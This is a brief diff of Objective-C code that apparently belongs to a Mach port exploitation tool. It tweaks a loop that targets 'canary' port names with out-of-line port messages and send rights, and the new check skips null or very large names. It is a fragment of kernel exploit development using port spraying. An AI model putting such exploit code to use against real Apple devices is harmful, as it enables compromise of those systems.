@@ -433,7 +433,7 @@
     for (int i = 0; i < CANARY_N; i += 4) {
         if (canaryAlive[i] != 1) continue;
         uint32_t w2 = (uint32_t)canary[i];
-        if (w2 == 0) continue; // MACH_PORT_NULL — skip
+        if (w2 == 0 || w2 > 4096) continue; // skip null / huge names (avoid 1MB+ allocs)
         NSDictionary *tr = [self sendOOLPortsCount:w2 realEntries:64 port:port sendRight:port useSpray:NO];
         targeted++;
         [self journal:[NSString stringWithFormat:@"targeted w2=%u port=%u send_kr=%@ recv_kr=%@",
